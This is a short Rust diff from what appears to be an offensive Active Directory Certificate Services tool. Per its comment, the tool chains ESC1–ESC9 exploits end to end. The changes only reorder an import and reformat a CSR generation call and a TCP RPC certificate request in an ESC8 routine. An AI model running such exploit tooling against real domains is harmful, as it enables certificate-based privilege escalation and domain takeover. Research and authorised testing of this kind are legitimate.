@@ -3,6 +3,7 @@
 //! Takes a CA URL + template + credentials and walks the entire ESC chain end-to-end,
 //! automatically assessing vulnerabilities and selecting the appropriate exploit path.
 
+use overthrone_core::adcs::csr::create_client_auth_csr;
 use overthrone_core::adcs::{
     esc1::Esc1Exploiter,
     esc2::Esc2Exploiter,
@@ -10,7 +11,6 @@ use overthrone_core::adcs::{
     esc6::Esc6Exploiter,
     esc9::{Esc9Config, Esc9Exploiter},
 };
-use overthrone_core::adcs::csr::create_client_auth_csr;
 use overthrone_core::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
@@ -721,18 +721,12 @@ async fn execute_esc8_rpc(
     let subject = target_upn.unwrap_or("cert-request");
 
     // Generate a client authentication CSR
-    let (csr_der, _private_key) =
-        create_client_auth_csr(subject, template, Some(ca_server)).map_err(|e| {
-            OverthroneError::Adcs(format!("Failed to generate CSR: {e}"))
-        })?;
+    let (csr_der, _private_key) = create_client_auth_csr(subject, template, Some(ca_server))
+        .map_err(|e| OverthroneError::Adcs(format!("Failed to generate CSR: {e}")))?;
 
     // Submit via TCP RPC
     let cert_der = crate::cert_store::request_cert_via_tcp_rpc(
-        ca_server,
-        ca_server,
-        template,
-        subject,
-        &csr_der,
+        ca_server, ca_server, template, subject, &csr_der,
     )
     .await?;
 
